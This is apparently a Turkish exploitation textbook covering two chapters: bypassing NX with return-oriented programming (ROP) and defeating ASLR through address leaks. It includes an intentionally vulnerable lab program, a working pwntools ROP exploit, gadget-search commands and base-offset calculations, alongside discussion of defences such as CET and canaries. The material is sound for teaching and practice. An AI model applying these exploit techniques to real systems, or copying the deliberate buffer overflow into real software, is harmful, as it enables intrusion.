> **Kısım IV · Korumalar teker teker.** NX, ASLR, GOT/PLT, canary ve PIE. Her bölüm bir koruma ekliyor ve onu nasıl aştığını gösteriyor.


# Bölüm 12: NX ve ROP'a giriş

## Bu bölümde

Bir önceki bölümün sonunda NX'in shellcode'u nasıl durdurduğunu gördün: program `-11` ile öldü. Bu bölümde NX açık bir programda yine istediğimiz şeyi yaptıracağız, ama tek bir bayt bile kendi kodumuzu çalıştırmadan. Programın içinde zaten var olan küçük kod parçalarını, **gadget**'ları, dönüş adresleriyle birbirine bağlayacağız. Bu tekniğe ROP deniyor ve modern exploit geliştirmenin bel kemiği. Bir kere mantığını oturttuğunda kitabın geri kalanı bunun varyasyonları olacak.

**Ön koşullar:** Bölüm 4 (argümanlar `rdi`'de), Bölüm 5 (`pop`, `ret`), Bölüm 10 (ret2win), Bölüm 11 (NX'in etkisi).

**Bu bölümün sonunda:**

- NX'in neyi engellediğini ve neyi engellemediğini ayırt edebileceksin.
- `ROPgadget` ile bir programda `pop rdi; ret` gibi gadget'ları bulabileceksin.
- Bir fonksiyonu kendi seçtiğin argümanla çağıran üç halkalı bir ROP zinciri kurabileceksin.
- Zincirin her halkasında `rsp`, `rdi` ve `rip`'in nasıl değiştiğini gdb'de gösterebileceksin.

## Sezgi: kesilmiş kelimelerden mektup

Eski filmlerdeki fidye mektuplarını hatırla. Kimse el yazısıyla yazmaz, gazeteden kesilmiş kelimeleri yapıştırır. Gazete zaten basılmış, değiştiremezsin. Ama içinden istediğin kelimeleri seçip istediğin sırayla dizersen, gazetenin hiç söylemediği bir cümle kurarsın.

ROP aynı fikir. Programın kodu değiştirilemez (`r-x`). Ama içinde `ret` ile biten binlerce küçük parça var. Yığına bu parçaların adreslerini art arda dizersek, her `ret` bir sonraki parçaya zıplar ve program, kaynak kodunda hiç olmayan bir iş yapar.

Benzetmenin bozulduğu yer: gazetede istediğin her kelimeyi bulamayabilirsin, ve ROP'ta da her parçayı bulamazsın. Küçük bir programda belki 70 parça vardır, ve aradığın `pop rdx; ret` aralarında olmayabilir. Bu yüzden ROP'un asıl gazetesi, yüz binlerce parçası olan libc. Ona Bölüm 15'te geçeceğiz.

## NX ne yapar, ne yapmaz

**NX** (No-eXecute), bir bellek sayfasının yazılabilir ya da çalıştırılabilir olabileceğini, ama ikisi birden olamayacağını söyler. Yığın yazılabilir olmak zorunda olduğu için çalıştırılamaz olur. Windows'ta aynı korumanın adı DEP.

`e04_rop`, `-z execstack` olmadan derlendi:

```bash
gcc -O0 -fno-stack-protector -no-pie -fcf-protection=none \
    -o ~/cracks/e04_rop ~/.cracks_src/e04_rop.c
pwn checksec ~/cracks/e04_rop
```

```text
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

Dikkatli oku: NX **kodun** çalışmasını engelliyor. **Dönüş adresini değiştirmeni** engellemiyor. `ret` hâlâ yığından ne bulursa oraya zıplıyor. Tek fark, artık sadece zaten çalıştırılabilir olan yerlere zıplayabiliyoruz: programın kendi kodu ve kütüphanelerin kodu.

## Hedef

```c
/* e04_rop: NX acik. Argumanli win() icin ROP. Kanarya/PIE yok. */
#include <stdio.h>
#include <unistd.h>

/* hediye: "pop rdi; ret" parcasi */
__asm__(".globl gadget\ngadget:\n pop %rdi\n ret\n");

void win(unsigned long key)
{
    if (key == 0xdeadbeefcafef00dUL)
        puts("tebrikler: dogru anahtarla win() calisti!");
    else
        printf("win() calisti ama anahtar yanlis: 0x%lx\n", key);
    _exit(0);
}

void vuln(void)
{
    char buf[32];
    printf("girdi: ");
    read(0, buf, 200);
}
```

`main` önceki örneklerle aynı. Yine bir `win` var, ama bu sefer bir **argüman** istiyor ve doğru anahtarla çağrılmazsa reddediyor. Bölüm 4'ten biliyorsun: ilk argüman `rdi`'de gelir. `win`'e zıplamadan önce `rdi`'ye `0xdeadbeefcafef00d` koymamız lazım.

`__asm__` satırı programa `pop rdi; ret` diye iki komut ekliyor ve onlara `gadget` adını veriyor. Bunu öğretmek için "hediye" olarak koyduk. Eskiden derleyicilerin ürettiği her programda `__libc_csu_init` adlı bir fonksiyonun içinde bu parça kendiliğinden bulunurdu. glibc 2.34'ten beri o fonksiyon yok, bu yüzden modern küçük programlarda `pop rdi; ret` bulmak zorlaştı. Bölüm 19'da onu libc'den alacağız.

## Önce düz ret2win dene

Bölüm 10'daki gibi doğrudan `win`'e zıplayalım. Mesafe yine 40, çünkü `vuln` aynı (`[rbp-0x20]`):

```bash
nm ~/cracks/e04_rop | grep -E ' (win|gadget)$'
python3 -c 'import sys; from pwn import p64; sys.stdout.buffer.write(b"A"*40 + p64(0x401168))' | ~/cracks/e04_rop
```

```text
0000000000401166 T gadget
0000000000401168 T win
girdi: win() calisti ama anahtar yanlis: 0x0
```

`win` çalıştı ama `rdi`'de o an ne varsa onu anahtar sandı. `0x0` bir tesadüf: `rdi`'de `read`'e verilen ilk argüman (0 = standart girdi) kalmış. Bölüm 4'teki benzetmeyi hatırla: işlemci bir cebe ne koyduğunu hatırlamaz. Bir yazmacı kontrol etmenin yoluna ihtiyacımız var.

## Gadget

Programın `0x401166` adresinde şu iki komut duruyor:

```nasm
pop rdi
ret
```

Bu ikilinin yığında ne yaptığını düşün:

1. `pop rdi`: yığının tepesindeki 8 baytı `rdi`'ye al.
2. `ret`: yığının tepesindeki **sonraki** 8 baytı `rip`'e al ve oraya zıpla.

Yani yığına art arda şunu dizersek:

```text
            ┌──────────────────────────┐
 dönüş adr. │ gadget  (pop rdi; ret)   │ ← vuln'ün ret'i buraya zıplar
            ├──────────────────────────┤
            │ 0xdeadbeefcafef00d       │ ← pop rdi bunu rdi'ye alır
            ├──────────────────────────┤
            │ win                      │ ← gadget'ın ret'i buraya zıplar
            └──────────────────────────┘
```

`vuln`'ün `ret`'i gadget'a zıplar. Gadget anahtarı `rdi`'ye koyar ve kendi `ret`'iyle `win`'e zıplar. `win` çalıştığında `rdi`'de bizim anahtarımız durur.

**`ret` ile biten kısa komut dizilerine gadget denir.** Gadget'ları yığına art arda dizip istediğin işi yaptırmaya da **ROP** (Return-Oriented Programming) denir. Her `ret`, yığından bir sonraki gadget'ın adresini alır. Yığın artık bir program gibi çalışır, dönüş adresleri de onun komutlarıdır. Bu programın "komut göstergesi" de `rsp`.

## Gadget avı

```bash
ROPgadget --binary ~/cracks/e04_rop | grep -E ': (pop rdi ; ret|ret)$'
ROPgadget --binary ~/cracks/e04_rop | tail -1
```

```text
0x0000000000401166 : pop rdi ; ret
0x0000000000401016 : ret
Unique gadgets found: 68
```

`ROPgadget` programın bütün çalıştırılabilir baytlarını tarar ve `ret` ile biten her diziyi listeler. Bu küçük programda bile 68 tane var. Çoğunu kimse yazmadı. Bir komutun **ortasından** başlayarak okununca ortaya çıkıyorlar. x86'da komutların uzunluğu değişken olduğu için, aynı bayt dizisi farklı bir noktadan okunmaya başlanınca bambaşka komutlara dönüşebilir. Bölüm 10'da "komutun ortasına zıplamak genelde çöker" demiştik. Gadget'lar, bunun işe yaradığı nadir durumlardan.

Aynı aramayı pwndbg'nin içinden de yapabilirsin: `rop --grep "pop rdi"`.

## Zincir

Bu dosya `~/.cracks_src/e04_rop_x.py` olarak duruyor:

```python
from pwn import *
import sys

e = ELF("/home/linkola/cracks/e04_rop", checksec=False)
pop_rdi = e.sym.gadget        # pop rdi ; ret
ret = pop_rdi + 1             # tek başına ret
align = len(sys.argv) > 1
chain = [pop_rdi, 0xdeadbeefcafef00d] + ([ret] if align else []) + [e.sym.win]
payload = b"A"*40 + b"".join(p64(x) for x in chain)
p = process(e.path)
p.send(payload)
print(p.recvall(timeout=2), p.poll())
```

## Deneme sürüşü

```bash
python3 e04_rop_x.py
```

```text
b'girdi: tebrikler: dogru anahtarla win() calisti!\n' 0
```

İlk ROP zincirin çalıştı. NX'e rağmen bir fonksiyonu kendi seçtiğin argümanla çağırdın, ve bunun için tek bir bayt kod çalıştırmadın.

`ret = pop_rdi + 1` satırına dikkat et. `pop rdi` tek baytlık bir komut (`5f`). Ondan bir bayt sonrası tek başına `ret` (`c3`). Bir gadget'ın ortasından başlamak bize bedava bir `ret` gadget'ı verdi. Betiğe bir argüman verirsen (`python3 e04_rop_x.py align`) zincire bu `ret`'i ekler. Bu programda iki hali de çalışıyor. Bölüm 15'te bu `ret`'in neden hayati olduğunu göreceğiz.

## Zinciri halka halka izlemek

Zinciri gdb'de `vuln`'ün `ret`'inde durdurup her `si`'de kaydettik:

| Adım | Ne çalıştı | `rip` | `rsp` | `rdi` | `[rsp]` |
|---|---|---|---|---|---|
| 0 | (`vuln`'ün `ret`'inden önce) | `0x4011ee` | `…d438` | `0` | `0x401166` |
| 1 | `vuln`'ün `ret`'i | **`0x401166`** | `…d440` | `0` | `0xdeadbeefcafef00d` |
| 2 | `pop rdi` | `0x401167` | `…d448` | **`0xdeadbeefcafef00d`** | `0x401168` |
| 3 | gadget'ın `ret`'i | **`0x401168`** | `…d450` | `0xdeadbeefcafef00d` | `0x7fffffffd540` |

1. `vuln`'ün `ret`'i yığından gadget'ın adresini aldı. `rip` artık gadget'ta.
2. `pop rdi` yığından anahtarı aldı. `rdi` hazır.
3. Gadget'ın `ret`'i yığından `win`'in adresini aldı. `win` çalışmaya başladı ve `rdi`'de doğru anahtar duruyor.

`rsp` her adımda 8 arttı. Yani `rsp`, ROP programımızda "sıradaki komutun nerede olduğunu" gösteren `rip` gibi davranıyor.

Son satırda `rsp` = `…d450`. Bu adres 16'nın katı. Normal bir `call` ile `win`'e girilseydi `rsp` 16'nın katından 8 fazla olurdu. Yani yığın şu an **hizasız**. `win` sadece `puts` ve `printf` çağırdığı için bu sefer sorun çıkmadı. Bölüm 15'te çıkacak.

Kendin izlemek için:

```bash
python3 -c 'import sys; from pwn import p64; sys.stdout.buffer.write(b"A"*40 + p64(0x401166) + p64(0xdeadbeefcafef00d) + p64(0x401168))' > /tmp/p4
pwndbg -q ~/cracks/e04_rop
b *vuln+52
r < /tmp/p4
stack 4
si
si
p/x $rdi
si
```

## Zincir yazmanın kuralları

Bir ROP zinciri yazarken yığını **yukarıdan aşağı okunan bir program** gibi düşün:

- Her **gadget adresi** bir komut.
- Her `pop` komutu, kendisinden **hemen sonraki** 8 baytı tüketir.
- Her `ret`, bir sonraki gadget'a geçer.

Birden çok argüman gerekiyorsa gadget'ları art arda dizersin:

```text
pop rdi ; ret     →  arg1
pop rsi ; ret     →  arg2
pop rdx ; ret     →  arg3
fonksiyon
```

Küçük programlarda bu gadget'ların hepsini bulamazsın. `pop rdx; ret` özellikle nadir. Bazen `pop rsi; pop r15; ret` gibi fazladan bir şey yapan gadget'lar bulursun. Onları da kullanabilirsin, sadece fazladan `pop` için zincire bir dolgu değeri koyman gerekir.

## Savunma tarafı

ROP, NX'e cevap olarak doğdu, ve ROP'a karşı da yeni savunmalar geliştirildi:

- **ASLR ve PIE**: gadget'ların adreslerini rastgele yapar. Bu programda PIE kapalı olduğu için `0x401166` sabitti. PIE açıkken önce bir adres sızdırman gerekir (Bölüm 18).
- **Canary**: dönüş adresine ulaşmayı fark eder (Bölüm 17).
- **CET**: Intel'in Kontrol Akışı Bütünlüğü teknolojisi iki parçadan oluşur. Gölge yığın, `ret`'in dönüş adresini korumalı bir kopyayla karşılaştırır. Bir ROP zincirindeki ilk `ret` bile bu kontrolden geçemez. IBT ise dolaylı `jmp`/`call` hedeflerinin `endbr64` ile başlamasını zorunlu kılar. Kitaptaki örnekleri `-fcf-protection=none` ile derledik, gerçek dağıtım paketleri bu işaretleri taşıyor. Korumanın gerçekten devreye girmesi için işlemcinin, çekirdeğin ve glibc'nin de bunu desteklemesi ve açık olması gerekiyor.
- **Gadget sayısını azaltmak**: bazı derleyici seçenekleri `ret` baytlarını azaltmaya ya da gadget'ları zararsız kılmaya çalışır. Pratikte libc'deki 100.000'den fazla gadget'a karşı etkileri sınırlı.

> [!WARNING]
> **Sık yapılan hatalar**
>
> - **Gadget'tan sonra argümanı koymayı unutmak.** `pop rdi`'den hemen sonraki 8 bayt `rdi`'ye gider. Oraya `win`'in adresini koyarsan `rdi` = `win` olur.
> - **Fazladan `pop`'ları hesaba katmamak.** `pop rsi; pop r15; ret` iki 8 bayt tüketir.
> - **Gadget adresini ROPgadget'tan değil `objdump`'tan tahmin etmek.** Gadget'ların çoğu bir komutun ortasında başlar ve `objdump`'ta görünmez.
> - **Zincir çalıştığı halde hedef fonksiyonun içinde çökmek.** Hizalama. Bölüm 15.

## Kontrol soruları

1. NX açıkken dönüş adresini değiştirebilir misin? Değiştirebiliyorsan neden shellcode çalışmıyor?
2. `pop rdi; ret` gadget'ı yığından kaç bayt tüketir?
3. Zincir `[pop_rdi, key, win]` iken `win` başladığında `rsp` kaç bayt ilerlemiş olur (`vuln`'ün `ret`'inden önceki değere göre)?
4. Hiç kimsenin yazmadığı gadget'lar nereden çıkıyor?
5. `ret = pop_rdi + 1` neden bir `ret` gadget'ı verir?
6. Gölge yığın bir ROP zincirini neden ilk `ret`'te durdurur?

## Alıştırmalar

1. **Gözlemle.** "Zinciri halka halka izlemek"teki adımları kendi ekranında tekrarla. `si`'lerden sonra `stack 3` çıktısının her seferinde nasıl kaydığına bak.
2. **Tahmin et, sonra dene.** Zincirde anahtarı `0x1337` yap. Program ne yazacak? Önce kâğıda yaz.
3. **Kendin yap.** `ret` gadget'ını zincirin **başına** koy: `[ret, pop_rdi, key, win]`. Hâlâ çalışıyor mu? `win`'e girdiğinde `rsp % 16` kaç olur? (gdb'de `p $rsp % 16`.)
4. **Kendin yap.** `ROPgadget --binary /usr/lib/libc.so.6 | tail -1` ile libc'deki gadget sayısına bak. Bu makinede: 101254.

## Özet

- NX yığındaki kodu çalıştırılamaz yapar, dönüş adresinin değiştirilmesini engellemez.
- Gadget: `ret` ile biten kısa komut dizisi. Çoğu bir komutun ortasından okunarak ortaya çıkar.
- ROP: gadget adreslerini yığına dizmek. `rsp`, ROP programının komut göstergesi gibi davranır.
- `pop rdi; ret` + değer + fonksiyon = fonksiyon(değer).
- Gadget bulmak için `ROPgadget` ya da pwndbg'de `rop`.
- Savunmalar: ASLR/PIE, canary, CET.

Bu programda `win`, `gadget` ve GOT gibi her şeyin adresi sabitti. Gerçek hedefte ise asıl ödül olan libc her çalıştırmada başka bir yerde. Bir sonraki bölümde bu sorunun kökündeki fikri göreceğiz.

---
**Kontrol sorularının cevapları**

1. Evet. Shellcode yığında duruyor, yığın ise çalıştırılamaz (`rw-`). `ret` oraya zıplar ama işlemci ilk komutu çalıştırmayı reddeder.
2. 16 bayt: `pop` 8, `ret` 8.
3. 24 bayt: üç `ret`/`pop` × 8. Tablodaki `…d438` → `…d450`.
4. x86 komutlarının uzunluğu değişken. Bir komutun ortasından başlayıp okuyunca başka geçerli komutlar çıkabiliyor.
5. `pop rdi` tek baytlık bir komut (`5f`). Bir sonraki bayt `c3`, yani `ret`.
6. Gölge yığında `vuln`'ün gerçek dönüş adresi (`main` içi) durur. `ret` yığındaki değerin (gadget) bu kopyayla uyuşmadığını görür.

**Bu bölümde geçen yeni terimler:** NX, DEP, gadget, ROP, ROP zinciri, `ROPgadget`, CET, gölge yığın, IBT.


# Bölüm 13: ASLR ve taban adresleri

## Bu bölümde

Şimdiye kadar her exploit'te bir adresi önceden bildik: `win`'in adresini `nm`'den, buffer'ın adresini programın kendisinden. Bu kısa bölüm, adresler her çalıştırmada değişirken nasıl ayakta kalacağımızın temel fikrini veriyor. Kitabın ikinci yarısının tamamı tek bir cümleye dayanıyor: **bir kütüphaneden tek bir adres öğrenirsen, bütün kütüphaneyi bilirsin.**

**Ön koşullar:** Bölüm 3 (bellek haritası, `ldd` deneyi).

**Bu bölümün sonunda:**

- ASLR'nin hangi bölgeleri kaydırdığını ve hangilerini kaydırmadığını sayabileceksin.
- Taban, offset ve adres arasındaki ilişkiyi formülle yazıp bir örnekte hesaplayabileceksin.
- Hesapladığın bir taban adresini "son üç basamak" kuralıyla sağlayabileceksin.
- Bir exploit'in neden iki aşamalı olması gerektiğini açıklayabileceksin.

## Sezgi: taşınan apartman

Bir apartmanı düşün. Her gece bütün bina vinçle kaldırılıp şehrin başka bir yerine konuyor. Sokak adresi her sabah değişiyor. Ama binanın içi değişmiyor: kapıdan girince 3. kattaki daire hep aynı yerde, asansörün sağında. Sabah binanın kapısının nerede olduğunu öğrenirsen, 3. kattaki daireyi de bulursun.

ASLR bir kütüphaneyi tam olarak böyle taşır: bütün olarak. İçindeki her fonksiyonun, kütüphanenin başına göre uzaklığı aynı kalır.

Benzetmenin bozulduğu yer: gerçek bir apartmanın kapısını sabah kendin gidip bulabilirsin. Bir programın içinden libc'nin nerede olduğunu görmenin doğrudan bir yolu yok. Program sana bunu bir şekilde söylemeli. Bu "söyletme" işine sızıntı diyoruz.

## ASLR neyi kaydırır

| Bölge | ASLR açıkken | Not |
|---|---|---|
| Yığın | değişir | |
| Heap | değişir | |
| Paylaşılan kütüphaneler (libc, ld.so) | değişir | |
| Programın kendisi | **PIE kapalıysa değişmez** (`0x400000`) | PIE açıksa değişir (Bölüm 18) |

`e04_rop` ve `e05_libc` PIE olmadan derlendi. Programın kendi kodu (`main`, gadget'lar, PLT, GOT) her zaman aynı adreste. Değişen sadece libc ve yığın.

## Taban + uzaklık

```text
1. çalıştırma                          2. çalıştırma (temsili)
libc tabanı   0x7ffff7db9000           libc tabanı   0x7a3c11e00000
   + 0x51030 ────────────────┐            + 0x51030 ────────────────┐
system        0x7ffff7e0a030 ◀┘        system        0x7a3c11e51030 ◀┘
   + 0x7b110 ───┐                         + 0x7b110 ───┐
puts  0x7ffff7e34110 ◀┘                puts  0x7a3c11e7b110 ◀┘
```

Sol sütun bu makinedeki ASLR kapalı değerler. Sağ sütundaki taban temsili. `system`'in libc'nin başından uzaklığı (**offset**) her çalıştırmada aynı. Bu sayı libc dosyasının içinde yazılı ve programı çalıştırmadan okunabilir:

```bash
python3 -c "from pwn import *; l=ELF('/usr/lib/libc.so.6'); print(hex(l.sym.system), hex(l.sym.puts))"
```

```text
0x51030 0x7b110
```

Formül:

> [!NOTE]
> **taban = öğrendiğin adres − o fonksiyonun offset'i**
>
> [!NOTE]
> **istediğin fonksiyon = taban + onun offset'i**

Örnek: bir şekilde `puts`'un o anki adresini öğrendin (`leaked_puts`):

```python
libc_base = leaked_puts - 0x7b110
system    = libc_base   + 0x51030
```

Bölüm 15'te bunu gerçek bir sızıntıyla yapacağız.

## Son üç basamak kuralı

Kütüphaneler her zaman bir sayfanın başına yüklenir. Bir sayfa `0x1000` bayt, yani taban adresinin son 12 biti (son üç hex basamağı) her zaman `000`'dır. İki sonuç çıkar:

1. **Sağlama:** hesapladığın taban `000` ile bitmiyorsa yanlış offset'i çıkarmışsın.
2. **Tanıma:** `puts`'un adresi her zaman `...110` ile biter, `system`'inki `...030` ile. Bir sızıntı dökümünde son üç basamağa bakıp hangi fonksiyon olduğunu tahmin edebilirsin.

Bu, kitaptaki en ucuz ve en kullanışlı sağlama yöntemi. Her sızıntıdan sonra kullanacağız.

## Sızıntı nedir

Programın bize bir libc adresi söylemesine **sızıntı (leak)** diyoruz. Kaynakları:

1. **Program kendisi yazdırır.** `e03_shell`'deki hediye gibi. Gerçekte hata ayıklama mesajlarında olur.
2. **Bir yazdırma fonksiyonunu biz çağırırız.** ROP ile `puts(bir_adres)` çağırıp bellekteki bir adresi ekrana döktürürüz. Bölüm 15.
3. **Format string hatası.** `printf(girdi)` ile yığındaki değerleri okuruz. Bölüm 16.
4. **Sonlandırılmamış metinler.** Program bir buffer'ı yazdırırken null bayt bulamazsa, yanındaki baytları da yazdırır.

Sızıntı aldıktan sonra exploit **iki aşamalı** olur:

```text
1. aşama:  sızdır  →  tabanı hesapla
2. aşama:  hesaplanmış adreslerle asıl saldırı
```

İki aşama programın **aynı çalıştırmasında** olmalı. Program kapanıp açılırsa ASLR yeni bir taban seçer ve hesabın çöpe gider. Program sadece tek bir girdi alıyorsa, birinci aşamanın sonunda onu tekrar `main`'e döndürürüz ki ikinci girdiyi de alsın. Bu da Bölüm 15'in konusu.

## Savunma tarafı

ASLR'nin gücü, sızıntı olmadığı sürece adresleri tahmin edilemez kılmasında. 64 bitlik Linux'ta kütüphane tabanında yaklaşık 28 bitlik rastgelelik var. Kör tahminle tutturma şansı yüz milyonda birin altında. Bu yüzden ASLR'ye karşı pratikte tek yol sızıntı. Savunma tarafının mesajı da buradan çıkıyor: **adres sızdırmak, başlı başına bir güvenlik hatasıdır.** Bir hata mesajında bir işaretçi değerini basan, `%p` ile log yazan ya da bir buffer'ı sonlandırmadan yazdıran kod, ASLR'yi tek başına etkisiz hale getirebilir.

> [!WARNING]
> **Sık yapılan hatalar**
>
> - **Tabanı programı yeniden başlattıktan sonra kullanmak.** Her çalıştırma yeni bir taban demek.
> - **Kendi libc'nin offset'lerini başka bir makinede kullanmak.** Offset'ler libc sürümüne göre değişir. CTF'lerde görevle birlikte verilen libc dosyasını kullan.
> - **Sağlamayı atlamak.** `000` kontrolü bir saniye sürer, saatler kazandırır.

## Kontrol soruları

1. PIE kapalı bir programda ASLR hangi bölgeleri kaydırır?
2. `puts` için `0x7d03874fc110` sızdıysa, tabanın son üç basamağı ne olmalı?
3. `printf`'in adresi `0x7f12345678f0` ve offset'i `0x5c8f0` ise taban kaçtır?
4. Sızıntı ve saldırı neden aynı çalıştırmada olmalı?
5. Bir sızıntıda son üç basamağı `030` olan bir libc adresi görürsen, bu makinede hangi fonksiyon olabilir?

## Alıştırmalar

1. **Gözlemle.** `pwndbg -q ~/cracks/e05_libc`, `b *main`, `r`, sonra `p system` ve `vmmap libc`. `system − taban` = `0x51030` mu?
2. **Tahmin et, sonra dene.** gdb'yi iki kere başlatıp `p system` yaz. Aynı adres mi çıkacak? Neden?
3. **Kendin yap.** `p puts` ve `p system` değerlerinden, libc dosyasına bakmadan, iki fonksiyon arasındaki mesafeyi hesapla. Sonra pwntools ile `l.sym.puts - l.sym.system` değerini bulup karşılaştır.

## Özet

- ASLR kütüphaneleri, yığını ve heap'i bütün olarak kaydırır. PIE'siz programın kodu yerinde kalır.
- Fonksiyon adresi = taban + offset. Offset dosyada sabit, taban her çalıştırmada değişir.
- Tek bir adres sızdırmak, bütün kütüphaneyi bilmek demek.
- Taban hep `000` ile biter: en ucuz sağlama.
- Exploit iki aşamalı: sızdır, sonra saldır. İkisi aynı çalıştırmada.

Peki hangi adresi sızdıracağız ve onu bellekte nerede bulacağız? Program libc'yi nasıl buluyorsa, biz de oradan bulacağız. Sırada GOT ve PLT var.

---
**Kontrol sorularının cevapları**

1. Yığın, heap ve paylaşılan kütüphaneler.
2. `000`. `puts`'un offset'i `0x7b110`, sızan adres `...110` ile biter, taban `...000`.
3. `0x7f123450b000`.
4. Program her başlatıldığında ASLR yeni bir taban seçer.
5. `system` (offset `0x51030`). Başka fonksiyonların da son üç basamağı `030` olabilir, emin olmak için ikinci bir sızıntı gerekir.

**Bu bölümde geçen yeni terimler:** taban adresi, offset, sızıntı, iki aşamalı exploit.

---

[← 06-shellcode](06-shellcode.md) · [İçindekiler](README.md) · [08-got-plt-ret2libc →](08-got-plt-ret2libc.md)
